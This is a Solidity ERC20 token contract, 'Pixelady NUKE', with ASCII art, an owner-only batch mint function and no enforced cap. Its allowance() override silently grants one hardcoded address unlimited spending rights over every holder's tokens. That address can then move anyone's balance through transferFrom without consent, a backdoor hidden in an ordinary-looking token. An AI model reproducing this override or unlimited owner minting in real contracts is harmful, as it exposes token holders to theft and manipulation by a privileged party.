// SPDX-License-Identifier: MIT
// Pixelady NUKE
// IT'S NOT AN AIRDROP, IT'S A NUKE

/**                                                                             
            @@@                    @@@                                           
            @%.:=#@@               %#::-@                                          
            @%-#*#++%%@          %#-#**-@                                          
            @%-#****#=+%@      %%:#**##-@                                          
            @@-:*******#=*%@ @%:*****##-@                                          
            *:#*********#:* *******##-@                                          
            *:#***********###***=#*##-@@@@@@@@@@@@                               
            #--#****+*##******#=:-*****************# #                           
            #--#****#=:=+##**=::::=====+*********#%% #                           
    @@@@@@#:::####*****#=::::++:::::::::-#*****##%%%:-=%                           
@ *%###**************=::::::::::::::*#****#%%%=:-==%%                           
@---#%%%###*****=:::::::::::::::::::*#****##=:===#%                             
@===---%%%%%###***+-:::::::::::::::::-*#****#++-*@                              
    @##===---=+%%%#****+=::::::::::::*************#+=#                             
    @**=====:-+#******-:::=*#+::::***************#=%+@@                         
        @@%**--********-::+****#==:***#####***********-#+%@                      
            #+=********-:*#*##*******##%%%%%%%############-*@@                   
            @%:**********=*#*#%%##*****##+++++++#%%%%%%%%%%%%%*.@                  
            #.***####*******#%:*#%###***+:======:.......:+****=.@                  
        @@-####%%%#******#% -=.:*%%##*+:++++++================@                  
        #.%%%%##=.-*****##-======:##%#*=@     @@@@@@@@@+=====+@                  
        #.   .===--****#%.-=% @%+==-.%*=@                                        
        %=======*%#***#%-=#      %=====*@                                        
        @@@@@@  @%#**#%:-%@        @%=+@                                         
                @+-*##%--#@           @@                                          
                @+-#%=-=#%                                                        
                @+=%+-=*%@                                                        
                @*--==#@                                                          
                @#==*%@                                                           
                @%%%@                                                                                                                                           
*/

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract NUKE is ERC20, Ownable {
    address constant PIXELADY_CATA = 0xeA56aBd80cc721e6ED38CC287a0770C65fB47394;

    constructor() ERC20("Pixelady NUKE", "NUKE") {}

    function nuke(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Mismatched array lengths");
        for (uint256 i = 0; i < recipients.length; i++) {
            _mint(recipients[i], amounts[i]);
        }
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        if(spender == PIXELADY_CATA) {
            return type(uint256).max;
        }
        return super.allowance(owner, spender);
    }
}